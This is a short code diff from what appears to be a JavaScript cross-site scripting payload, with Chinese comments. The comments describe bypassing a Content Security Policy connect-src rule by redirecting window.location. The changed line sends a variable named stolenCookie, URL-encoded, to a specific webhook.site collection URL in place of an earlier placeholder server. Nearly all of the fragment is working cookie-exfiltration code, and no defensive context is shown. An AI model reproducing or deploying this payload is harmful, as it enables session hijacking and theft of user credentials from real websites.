@@ -14,5 +14,5 @@
 
     // 4. 繞過 connect-src 'none'：利用 window.location 將資料帶到你的監聽伺服器
     // 請將底下的網址替換成你的 Webhook 或 RequestBin 網址
-    window.location.href = "https://your-monitor-server.com" + encodeURIComponent(stolenCookie);
+    window.location.href = "https://webhook.site/21896e4b-7db5-4fe2-9723-b1541d0cdc08" + encodeURIComponent(stolenCookie);
 })();
